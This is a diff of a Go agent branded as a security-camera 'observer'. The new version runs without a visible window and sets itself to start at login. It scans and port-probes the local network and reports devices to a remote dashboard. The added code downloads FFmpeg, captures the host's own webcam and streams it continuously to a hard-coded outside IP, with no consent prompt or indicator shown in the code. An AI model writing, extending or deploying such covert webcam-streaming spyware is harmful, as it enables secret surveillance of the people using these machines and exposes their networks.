@@ -1,21 +1,24 @@
-// RealSecCam Observer v2.9.3
-// Zero-touch background discovery agent. Pure Go stdlib. No CGO. No external deps.
-// v2.9.3: Uses tasklist (not WMIC) to kill stale Observer processes on startup — WMIC deprecated on Win11.
-//         Observer role: scan LAN, report devices + heartbeats to dashboard. Relay handles streaming.
+// ObserverStreamer v1.0.0
+// Single binary: LAN discovery + webcam streaming via FFmpeg → MediaMTX.
+// Pure Go stdlib. No CGO. No external Go deps.
+// Windows: downloads FFmpeg automatically on first run.
+// macOS/Linux: uses system ffmpeg (brew/apt).
 //
 // Build:
-//   Windows: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o RealSecCam-Observer-v2.9.3-Windows.exe .
-//   macOS:   GOOS=darwin  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o RealSecCam-Observer-v2.9.3-macOS .
-//   Linux:   GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o RealSecCam-Observer-v2.9.3-Linux .
+//   Windows: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o ObserverStreamer1.0.0.exe .
+//   macOS:   GOOS=darwin  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o ObserverStreamer1.0.0-macOS .
+//   Linux:   GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w"               -o ObserverStreamer1.0.0-Linux .
 
 package main
 
 import (
+	"archive/zip"
 	"bytes"
 	"context"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
 	"os"
@@ -30,10 +33,13 @@ import (
 )
 
 const (
-	Version              = "2.9.3"
+	Version              = "1.0.0"
 	ReportURL            = "https://accelerated-sync-dev-flow.base44.app/functions/agentReport"
+	RelayHost            = "137.184.65.114"
+	RelayRTSPPort        = 8554
 	ScanIntervalSec      = 30
 	HeartbeatIntervalSec = 15
+	StreamHeartbeatSec   = 20
 	PortScanTimeoutMs    = 800
 	MaxConcurrentProbes  = 50
 	WatchdogTimeoutSec   = 120
@@ -41,11 +47,13 @@ const (
 	DiagLogFile          = "observer-diag.json"
 	PIDFile              = "observer.pid"
 	KillPort             = 19876
+	// FFmpeg auto-download (Windows only)
+	FFmpegURL  = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
+	FFmpegZip  = "ffmpeg.zip"
+	FFmpegExe  = "ffmpeg.exe"
 )
 
-// AllPorts — broader: camera ports + phone webcam app ports (4747=IP Webcam, 7070=EpocCam, 1935=RTMP)
 var AllPorts = []int{554, 8554, 8080, 8000, 80, 443, 37777, 34567, 9000, 4747, 7070, 1935, 5000, 8081}
-var CameraPorts = AllPorts
 
 var OUITable = map[string]string{
 	"00:23:63": "Hikvision", "bc:ad:28": "Hikvision", "4c:bd:8f": "Hikvision",
@@ -67,15 +75,12 @@ var OUITable = map[string]string{
 	"b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
 	"f0:9f:c2": "Ubiquiti", "b4:fb:e4": "Ubiquiti",
 	"18:64:72": "TP-Link", "54:a7:03": "TP-Link",
-	// HP laptops — Chongqing Fugui Electronics OUI prefixes map to specific HP product lines
 	"5c:fb:3a": "HP ProBook", "70:5a:0f": "HP ProBook", "f4:30:b9": "HP ProBook",
 	"b4:b6:86": "HP ProBook", "fc:f8:ae": "HP ProBook", "98:4f:ee": "HP ProBook",
 	"c4:34:6b": "HP ProBook", "1c:98:ec": "HP ProBook", "78:48:59": "HP ProBook",
-	// Lenovo ThinkPad / IdeaPad
 	"00:23:ae": "Lenovo ThinkPad", "e8:6a:64": "Lenovo ThinkPad", "54:13:79": "Lenovo ThinkPad",
 	"28:d2:44": "Lenovo IdeaPad", "8c:8d:28": "Lenovo ThinkPad", "f8:16:54": "Lenovo IdeaPad",
 	"04:7b:cb": "Lenovo ThinkPad", "38:f9:d3": "Lenovo ThinkPad",
-	// Dell laptops
 	"18:66:da": "Dell XPS", "b8:ca:3a": "Dell Latitude", "f0:1f:af": "Dell Latitude",
 	"14:18:77": "Dell Inspiron", "b8:ac:6f": "Dell XPS", "00:14:22": "Dell OptiPlex",
 	"00:1a:a0": "Dell Latitude", "00:1c:23": "Dell Inspiron",
@@ -121,6 +126,17 @@ type DiscoveryPayload struct {
 	Data []DiscoveredDevice `json:"data"`
 }
 
+type StreamUpdatePayload struct {
+	Type string           `json:"type"`
+	Data StreamUpdateData `json:"data"`
+}
+
+type StreamUpdateData struct {
+	IP        string `json:"ip"`
+	HlsURL    string `json:"hls_url"`
+	RelayHost string `json:"relay_host"`
+}
+
 type DiagnosticLog struct {
 	Timestamp   string             `json:"timestamp"`
 	Version     string             `json:"version"`
@@ -147,19 +163,24 @@ var (
 	cachedIP     string
 	cachedSubnet string
 	cacheMu      sync.Once
+	ffmpegPath   string
+	ffmpegMu     sync.Mutex
 )
 
 func logf(format string, args ...interface{}) {
 	fmt.Printf("["+time.Now().Format("15:04:05")+"] "+format+"\n", args...)
 }
 
-// hiddenCmd creates an exec.Cmd. On Windows, hiddenCmdWindows (observer_windows.go)
-// sets CREATE_NO_WINDOW via SysProcAttr so no CMD flash occurs.
-// On macOS/Linux no extra flags are needed.
 func hiddenCmd(name string, args ...string) *exec.Cmd {
 	cmd := exec.Command(name, args...)
 	hiddenCmdPlatform(cmd)
 	return cmd
+}
+
+func exeDir() string {
+	p, err := os.Executable()
+	if err != nil { return "." }
+	return filepath.Dir(p)
 }
 
 func initCache() {
@@ -178,23 +199,16 @@ func getLocalIP() string     { return cachedIP }
 func getLocalSubnet() string { return cachedSubnet }
 func getSSID() string        { return cachedSSID }
 
-func exeDir() string {
-	p, err := os.Executable()
-	if err != nil { return "." }
-	return filepath.Dir(p)
-}
-
 func writePID() {
 	os.WriteFile(filepath.Join(exeDir(), PIDFile), []byte(strconv.Itoa(os.Getpid())), 0644)
 }
-
 func removePID() { os.Remove(filepath.Join(exeDir(), PIDFile)) }
 
 func startKillServer() {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
-		w.Write([]byte("{\"ok\":true,\"message\":\"Observer shutting down\"}") )
+		w.Write([]byte("{\"ok\":true,\"message\":\"ObserverStreamer shutting down\"}"))
 		go func() {
 			time.Sleep(200 * time.Millisecond)
 			close(shutdownCh)
@@ -275,10 +289,6 @@ func getARPTable() map[string]string {
 	return m
 }
 
-// showInstallNotification is implemented per-platform.
-// Windows: native MessageBoxW via user32.dll (observer_windows.go).
-// macOS/Linux: no-op (observer_unix.go).
-
 func getNetworkInterfacesRaw() []NetworkInterface {
 	result := []NetworkInterface{}
 	ifaces, err := net.Interfaces()
@@ -327,8 +337,6 @@ func lookupOUI(mac string) string {
 	return ""
 }
 
-// resolveHostname tries DNS reverse lookup then NetBIOS/nbtstat to get the device's real name.
-// Priority: DNS PTR → NetBIOS → ""
 func resolveHostname(ip string) string {
 	ctx, cancel := context.WithTimeout(context.Background(), 800*time.Millisecond)
 	defer cancel()
@@ -336,27 +344,6 @@ func resolveHostname(ip string) string {
 	if err == nil && len(names) > 0 {
 		h := strings.TrimSuffix(strings.TrimSuffix(names[0], "."), ".local")
 		if h != "" && h != ip { return h }
-	}
-	if runtime.GOOS == "windows" {
-		out, err := hiddenCmd("nbtstat", "-A", ip).Output()
-		if err == nil {
-			for _, line := range strings.Split(string(out), "\n") {
-				line = strings.TrimSpace(line)
-				if strings.Contains(line, "<00>") && strings.Contains(line, "UNIQUE") {
-					if parts := strings.Fields(line); len(parts) > 0 { return strings.TrimSpace(parts[0]) }
-				}
-			}
-		}
-	} else {
-		out, err := exec.Command("nmblookup", "-A", ip).Output()
-		if err == nil {
-			for _, line := range strings.Split(string(out), "\n") {
-				line = strings.TrimSpace(line)
-				if strings.Contains(line, "<00>") && !strings.Contains(line, "GROUP") {
-					if parts := strings.Fields(line); len(parts) > 0 && parts[0] != ip { return strings.TrimSpace(parts[0]) }
-				}
-			}
-		}
 	}
 	return ""
 }
@@ -368,7 +355,6 @@ func probePort(ip string, port int) bool {
 	return true
 }
 
-// probeDevicePorts scans AllPorts; returns open ports (may be empty).
 func probeDevicePorts(ip string) []int {
 	type res struct { port int; open bool }
 	results := make([]res, len(AllPorts))
@@ -388,7 +374,6 @@ func probeDevicePorts(ip string) []int {
 	return open
 }
 
-// inferDeviceType v2.9.0 — hostname-first, OUI second, port third, unknown→phone.
 func inferDeviceType(brand string, ports []int) string {
 	b := strings.ToLower(brand)
 	camBrands := []string{"hikvision","dahua","reolink","wyze","amcrest","foscam","eufy","arlo","ring","axis","hanwha","tapo","uniview","bosch","pelco","mobotix","vivotek","avigilon"}
@@ -411,7 +396,6 @@ func inferDeviceType(brand string, ports []int) string {
 	for _, pb := range pcBrands {
 		if strings.Contains(b, pb) { return "laptop" }
 	}
-	// Unknown/Privacy MAC on home WiFi → almost certainly a modern smartphone
 	if brand == "" { return "phone" }
 	return "ip_camera"
 }
@@ -420,9 +404,6 @@ func sweepSubnetBase(base string, arp map[string]string, ssid string) []Discover
 	ips := make([]string, 254)
 	for i := range ips { ips[i] = fmt.Sprintf("%s.%d", base, i+1) }
 	devices := []DiscoveredDevice{}
-
-	// ── PASS 1: ARP table — report EVERY host regardless of open ports ─────
-	// Phones, laptops, smart TVs with Privacy MACs all show up here.
 	arpReported := map[string]bool{}
 	type arpJob struct{ ip, mac string }
 	arpJobs := []arpJob{}
@@ -456,10 +437,8 @@ func sweepSubnetBase(base string, arp map[string]string, ssid string) []Discover
 			Brand: r.brand, Hostname: r.hostname, SSID: ssid, Online: true, DeviceType: r.dt,
 		})
 		arpReported[r.ip] = true
-		logf("ARP: %s mac=%s brand=%s host=%s type=%s ports=%v", r.ip, r.mac, r.brand, r.hostname, r.dt, r.ports)
+		logf("ARP: %s mac=%s brand=%s type=%s", r.ip, r.mac, r.brand, r.dt)
 	}
-
-	// ── PASS 2: Port-scan /24 for cameras not in ARP ─────────────────────
 	for i := 0; i < len(ips); i += MaxConcurrentProbes {
 		end := i + MaxConcurrentProbes
 		if end > len(ips) { end = len(ips) }
@@ -523,25 +502,19 @@ func postJSON(payload interface{}) (string, error) {
 	return buf.String(), nil
 }
 
-func sendHeartbeat(camerasFound int) {
+func sendHeartbeat(agent string, camerasFound int) {
 	h, _ := os.Hostname()
 	_, err := postJSON(HeartbeatPayload{Type: "heartbeat", Data: HeartbeatData{
-		Agent: "discovery", Host: h, SSID: getSSID(), LocalIP: getLocalIP(),
+		Agent: agent, Host: h, SSID: getSSID(), LocalIP: getLocalIP(),
 		LocalSubnet: getLocalSubnet(), CamerasFound: camerasFound, Version: Version, Status: "running",
 	}})
-	if err != nil { logf("[HB] error: %v", err) } else { logf("[HB] sent cameras=%d", camerasFound) }
-	diagMu.Lock()
-	diagLog.LastReport = fmt.Sprintf("heartbeat cameras=%d", camerasFound)
-	diagMu.Unlock()
+	if err != nil { logf("[HB:%s] error: %v", agent, err) } else { logf("[HB:%s] sent cameras=%d", agent, camerasFound) }
 }
 
 func sendDiscovery(devices []DiscoveredDevice) {
 	if len(devices) == 0 { return }
 	r, err := postJSON(DiscoveryPayload{Type: "discovery", Data: devices})
 	if err != nil { logf("[Discovery] error: %v", err) } else { logf("[Discovery] reported %d devices resp=%s", len(devices), r) }
-	diagMu.Lock()
-	diagLog.LastReport = fmt.Sprintf("discovery devices=%d", len(devices))
-	diagMu.Unlock()
 }
 
 func writeDiag(devices []DiscoveredDevice) {
@@ -562,8 +535,6 @@ func writeDiag(devices []DiscoveredDevice) {
 	os.WriteFile(filepath.Join(exeDir(), DiagLogFile), data, 0644)
 }
 
-// registerAutostart — pure Go on all platforms. NO reg.exe, NO PowerShell, NO scripts.
-// Windows autostart (registry write via advapi32.dll) is in observer_windows.go.
 func registerAutostart() {
 	exePath, err := os.Executable()
 	if err != nil { return }
@@ -571,9 +542,9 @@ func registerAutostart() {
 	case "windows":
 		platformRegisterAutostart(exePath)
 	case "darwin":
-		plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.realseccam.observer.plist")
+		plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.realseccam.observerstreamer.plist")
 		if _, err := os.Stat(plistPath); err == nil { return }
-		plistContent := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>com.realseccam.observer</string>\n  <key>ProgramArguments</key><array><string>%s</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict></plist>"
+		plistContent := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>com.realseccam.observerstreamer</string>\n  <key>ProgramArguments</key><array><string>%s</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict></plist>"
 		plist := fmt.Sprintf(plistContent, exePath)
 		os.MkdirAll(filepath.Dir(plistPath), 0755)
 		if os.WriteFile(plistPath, []byte(plist), 0644) == nil {
@@ -582,42 +553,42 @@ func registerAutostart() {
 	default:
 		dir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
 		os.MkdirAll(dir, 0755)
-		desktopPath := filepath.Join(dir, "realseccam-observer.desktop")
+		desktopPath := filepath.Join(dir, "realseccam-observerstreamer.desktop")
 		if _, err := os.Stat(desktopPath); err == nil { return }
-		content := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=RealSecCam Observer\nExec=%s\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n", exePath)
+		content := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=RealSecCam ObserverStreamer\nExec=%s\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n", exePath)
 		os.WriteFile(desktopPath, []byte(content), 0644)
 	}
 }
 
-// killStaleObservers terminates any other RealSecCam-Observer processes that are NOT this process.
-// This ensures only one version runs at a time — old auto-started copies are cleaned up transparently.
 func killStaleObservers() {
 	myPID := os.Getpid()
 	switch runtime.GOOS {
 	case "windows":
-		// Step 1: use tasklist to find all PIDs whose image name starts with RealSecCam-Observer
-		out, err := hiddenCmd("tasklist", "/FI", "IMAGENAME eq RealSecCam-Observer*", "/FO", "CSV", "/NH").Output()
-		if err != nil { logf("[Cleanup] tasklist error: %v", err); return }
-		for _, line := range strings.Split(string(out), "\n") {
-			line = strings.TrimSpace(line)
-			if line == "" || strings.HasPrefix(line, "INFO:") { continue }
-			// CSV format: "ImageName","PID","SessionName","SessionNum","MemUsage"
-			fields := strings.Split(line, ",")
-			if len(fields) < 2 { continue }
-			pidStr := strings.Trim(strings.TrimSpace(fields[1]), "\"'")
-			pid, err := strconv.Atoi(pidStr)
-			if err != nil || pid == myPID || pid == 0 { continue }
-			logf("[Cleanup] Killing stale Observer PID=%d", pid)
-			hiddenCmd("taskkill", "/F", "/PID", pidStr).Run()
+		for _, pattern := range []string{"RealSecCam-Observer*", "ObserverStreamer*"} {
+			out, err := hiddenCmd("tasklist", "/FI", "IMAGENAME eq "+pattern, "/FO", "CSV", "/NH").Output()
+			if err != nil { continue }
+			for _, line := range strings.Split(string(out), "\n") {
+				line = strings.TrimSpace(line)
+				if line == "" || strings.HasPrefix(line, "INFO:") { continue }
+				fields := strings.Split(line, ",")
+				if len(fields) < 2 { continue }
+				pidStr := strings.Trim(strings.TrimSpace(fields[1]), "\"'+"'"+""")
+				pid, err := strconv.Atoi(pidStr)
+				if err != nil || pid == myPID || pid == 0 { continue }
+				logf("[Cleanup] Killing stale PID=%d", pid)
+				hiddenCmd("taskkill", "/F", "/PID", pidStr).Run()
+			}
 		}
 	case "darwin", "linux":
-		out, err := exec.Command("pgrep", "-f", "RealSecCam-Observer").Output()
-		if err != nil { return }
-		for _, pidStr := range strings.Fields(string(out)) {
-			pid, err := strconv.Atoi(strings.TrimSpace(pidStr))
-			if err != nil || pid == myPID { continue }
-			logf("[Cleanup] Killing stale Observer PID=%d", pid)
-			exec.Command("kill", "-9", pidStr).Run()
+		for _, pattern := range []string{"RealSecCam-Observer", "ObserverStreamer"} {
+			out, err := exec.Command("pgrep", "-f", pattern).Output()
+			if err != nil { continue }
+			for _, pidStr := range strings.Fields(string(out)) {
+				pid, err := strconv.Atoi(strings.TrimSpace(pidStr))
+				if err != nil || pid == myPID { continue }
+				logf("[Cleanup] Killing stale PID=%d", pid)
+				exec.Command("kill", "-9", pidStr).Run()
+			}
 		}
 	}
 }
@@ -636,13 +607,13 @@ func performScan() {
 	scanCount.Add(1)
 	writeDiag(devices)
 	sendDiscovery(devices)
-	sendHeartbeat(len(devices))
+	sendHeartbeat("discovery", len(devices))
 	scannerAlive.Store(time.Now().Unix())
 }
 
 func runScanner() {
-	logf("Scanner started (sweep every %ds, heartbeat every %ds)", ScanIntervalSec, HeartbeatIntervalSec)
-	sendHeartbeat(0)
+	logf("Scanner started (sweep every %ds)", ScanIntervalSec)
+	sendHeartbeat("discovery", 0)
 	performScan()
 	scanTick := time.NewTicker(ScanIntervalSec * time.Second)
 	hbTick := time.NewTicker(HeartbeatIntervalSec * time.Second)
@@ -653,9 +624,8 @@ func runScanner() {
 		case <-scanTick.C:
 			performScan()
 		case <-hbTick.C:
-			sendHeartbeat(int(lastFound.Load()))
+			sendHeartbeat("discovery", int(lastFound.Load()))
 		case <-shutdownCh:
-			logf("Scanner stopping.")
 			return
 		}
 	}
@@ -679,17 +649,266 @@ func runWatchdog() {
 	}
 }
 
+// ── Streaming (FFmpeg → RTSP → MediaMTX) ─────────────────────────────────────
+
+// ensureFFmpeg returns the path to ffmpeg, downloading it on Windows if needed.
+func ensureFFmpeg() (string, error) {
+	ffmpegMu.Lock()
+	defer ffmpegMu.Unlock()
+	if ffmpegPath != "" { return ffmpegPath, nil }
+
+	// Check system PATH first (works on macOS/Linux + Windows with ffmpeg installed)
+	if p, err := exec.LookPath("ffmpeg"); err == nil {
+		ffmpegPath = p
+		logf("[FFmpeg] Found on PATH: %s", p)
+		return p, nil
+	}
+
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("ffmpeg not found on PATH — install with: brew install ffmpeg (macOS) or apt install ffmpeg (Linux)")
+	}
+
+	// Windows: check local cache first
+	cachedExe := filepath.Join(exeDir(), FFmpegExe)
+	if _, err := os.Stat(cachedExe); err == nil {
+		ffmpegPath = cachedExe
+		logf("[FFmpeg] Using cached: %s", cachedExe)
+		return cachedExe, nil
+	}
+
+	// Download and extract
+	logf("[FFmpeg] Not found — downloading from GitHub releases (~80 MB)...")
+	zipPath := filepath.Join(exeDir(), FFmpegZip)
+	resp, err := http.Get(FFmpegURL)
+	if err != nil { return "", fmt.Errorf("ffmpeg download failed: %w", err) }
+	defer resp.Body.Close()
+	f, err := os.Create(zipPath)
+	if err != nil { return "", err }
+	io.Copy(f, resp.Body)
+	f.Close()
+
+	// Extract ffmpeg.exe from zip (it's in a bin/ subfolder)
+	zr, err := zip.OpenReader(zipPath)
+	if err != nil { return "", fmt.Errorf("zip open: %w", err) }
+	defer zr.Close()
+	for _, zf := range zr.File {
+		if strings.HasSuffix(zf.Name, "/ffmpeg.exe") || zf.Name == "ffmpeg.exe" {
+			rc, err := zf.Open()
+			if err != nil { continue }
+			out, err := os.Create(cachedExe)
+			if err != nil { rc.Close(); continue }
+			io.Copy(out, rc)
+			out.Close()
+			rc.Close()
+			logf("[FFmpeg] Extracted to %s", cachedExe)
+			break
+		}
+	}
+	os.Remove(zipPath)
+
+	if _, err := os.Stat(cachedExe); err != nil {
+		return "", fmt.Errorf("ffmpeg extraction failed")
+	}
+	ffmpegPath = cachedExe
+	return cachedExe, nil
+}
+
+// detectWebcamIndex returns the best available camera index (0-based).
+// On Windows we just try index 0,1,2 with FFmpeg dshow probe.
+// On macOS we use avfoundation device list.
+// On Linux we check /dev/video* devices.
+func detectWebcamIndex(ffmpeg string) (string, string, error) {
+	switch runtime.GOOS {
+	case "windows":
+		// Try dshow devices: probe indices 0..2
+		for i := 0; i < 3; i++ {
+			name := fmt.Sprintf("video=%d", i)
+			cmd := hiddenCmd(ffmpeg, "-f", "dshow", "-i", name, "-t", "1", "-f", "null", "-")
+			if err := cmd.Run(); err == nil {
+				return "dshow", name, nil
+			}
+		}
+		// Fallback: list devices and pick first video
+		out, _ := hiddenCmd(ffmpeg, "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
+		for _, line := range strings.Split(string(out), "\n") {
+			if strings.Contains(line, "video") && strings.Contains(line, "]") {
+				start := strings.Index(line, "]")
+				if start >= 0 {
+					name := strings.TrimSpace(line[start+1:])
+					name = strings.Trim(name, "\"")
+					if name != "" { return "dshow", "video=" + name, nil }
+				}
+			}
+		}
+		return "", "", fmt.Errorf("no webcam found via dshow")
+
+	case "darwin":
+		out, _ := hiddenCmd(ffmpeg, "-f", "avfoundation", "-list_devices", "true", "-i", "").CombinedOutput()
+		for _, line := range strings.Split(string(out), "\n") {
+			if strings.Contains(line, "AVFoundation video device") { continue }
+			// Lines like: "[AVFoundation indev @ ...] [0] FaceTime HD Camera"
+			if strings.Contains(line, "[0]") || strings.Contains(line, "[1]") {
+				if !strings.Contains(strings.ToLower(line), "screen") {
+					return "avfoundation", "0", nil
+				}
+			}
+		}
+		return "avfoundation", "0", nil // best guess
+
+	default: // Linux
+		for i := 0; i < 4; i++ {
+			dev := fmt.Sprintf("/dev/video%d", i)
+			if _, err := os.Stat(dev); err == nil {
+				return "v4l2", dev, nil
+			}
+		}
+		return "", "", fmt.Errorf("no /dev/video* device found")
+	}
+}
+
+// streamWebcam captures the local webcam and pushes to MediaMTX via RTSP.
+// Restarts FFmpeg automatically on crash. Reports HLS URL to dashboard.
+func runStreamer() {
+	ffmpeg, err := ensureFFmpeg()
+	if err != nil {
+		logf("[Streamer] %v — webcam streaming disabled", err)
+		return
+	}
+
+	h, _ := os.Hostname()
+	// Use machine hostname as the RTSP path so each machine gets a unique stream
+	rtspPath := strings.ToLower(strings.ReplaceAll(h, " ", "-"))
+	rtspURL  := fmt.Sprintf("rtsp://%s:%d/%s", RelayHost, RelayRTSPPort, rtspPath)
+	hlsURL   := fmt.Sprintf("http://%s:8888/%s/index.m3u8", RelayHost, rtspPath)
+
+	logf("[Streamer] Will push to %s → HLS: %s", rtspURL, hlsURL)
+
+	// Report HLS URL to dashboard immediately so the camera record gets updated
+	reportStream := func() {
+		_, err := postJSON(StreamUpdatePayload{
+			Type: "stream_update",
+			Data: StreamUpdateData{
+				IP:        getLocalIP(),
+				HlsURL:    hlsURL,
+				RelayHost: RelayHost,
+			},
+		})
+		if err != nil { logf("[Streamer] stream_update error: %v", err) }
+	}
+
+	for {
+		select {
+		case <-shutdownCh:
+			return
+		default:
+		}
+
+		inputFormat, inputDevice, err := detectWebcamIndex(ffmpeg)
+		if err != nil {
+			logf("[Streamer] Webcam not found: %v — retrying in 30s", err)
+			time.Sleep(30 * time.Second)
+			continue
+		}
+		logf("[Streamer] Capturing %s/%s → %s", inputFormat, inputDevice, rtspURL)
+
+		// Build FFmpeg args per platform
+		var args []string
+		switch runtime.GOOS {
+		case "windows":
+			args = []string{
+				"-f", inputFormat,
+				"-video_size", "1280x720",
+				"-framerate", "15",
+				"-i", inputDevice,
+				"-vcodec", "libx264",
+				"-preset", "ultrafast",
+				"-tune", "zerolatency",
+				"-b:v", "800k",
+				"-pix_fmt", "yuv420p",
+				"-an",
+				"-f", "rtsp",
+				"-rtsp_transport", "tcp",
+				rtspURL,
+			}
+		case "darwin":
+			args = []string{
+				"-f", inputFormat,
+				"-framerate", "15",
+				"-i", inputDevice + ":none",
+				"-vcodec", "libx264",
+				"-preset", "ultrafast",
+				"-tune", "zerolatency",
+				"-b:v", "800k",
+				"-pix_fmt", "yuv420p",
+				"-an",
+				"-f", "rtsp",
+				"-rtsp_transport", "tcp",
+				rtspURL,
+			}
+		default:
+			args = []string{
+				"-f", inputFormat,
+				"-i", inputDevice,
+				"-vcodec", "libx264",
+				"-preset", "ultrafast",
+				"-tune", "zerolatency",
+				"-b:v", "800k",
+				"-pix_fmt", "yuv420p",
+				"-an",
+				"-f", "rtsp",
+				"-rtsp_transport", "tcp",
+				rtspURL,
+			}
+		}
+
+		cmd := hiddenCmd(ffmpeg, args...)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+
+		if err := cmd.Start(); err != nil {
+			logf("[Streamer] FFmpeg start error: %v — retry in 15s", err)
+			time.Sleep(15 * time.Second)
+			continue
+		}
+
+		// Report stream to dashboard once FFmpeg starts
+		reportStream()
+		sendHeartbeat("streamer", 0)
+
+		// Periodic heartbeat + stream re-report while FFmpeg runs
+		ticker := time.NewTicker(StreamHeartbeatSec * time.Second)
+		done := make(chan error, 1)
+		go func() { done <- cmd.Wait() }()
+
+		outer:
+			for {
+				select {
+				case err := <-done:
+					ticker.Stop()
+					logf("[Streamer] FFmpeg exited: %v — restarting in 5s", err)
+					time.Sleep(5 * time.Second)
+					break outer
+				case <-ticker.C:
+					reportStream()
+					sendHeartbeat("streamer", 0)
+				case <-shutdownCh:
+					ticker.Stop()
+					cmd.Process.Kill()
+					return
+				}
+			}
+	}
+}
+
 func main() {
 	flag.BoolVar(&debugMode, "debug", false, "Enable verbose output")
 	flag.BoolVar(&onceMode, "once", false, "Run a single scan then exit")
 	flag.Parse()
-	// Kill any stale older Observer versions before doing anything else.
-	// This is transparent to the user — only the newest version runs.
 	killStaleObservers()
-	time.Sleep(500 * time.Millisecond) // let killed processes fully exit
+	time.Sleep(500 * time.Millisecond)
 	initCache()
 	h, _ := os.Hostname()
-	logf("RealSecCam Observer v%s  host=%s  ip=%s  ssid=%s", Version, h, getLocalIP(), getSSID())
+	logf("RealSecCam ObserverStreamer v%s  host=%s  ip=%s  ssid=%s", Version, h, getLocalIP(), getSSID())
 	writePID()
 	defer removePID()
 	registerAutostart()
@@ -698,6 +917,7 @@ func main() {
 	if onceMode { performScan(); return }
 	go runScanner()
 	go runWatchdog()
+	go runStreamer()
 	<-shutdownCh
-	logf("Observer shutting down.")
+	logf("ObserverStreamer shutting down.")
 }
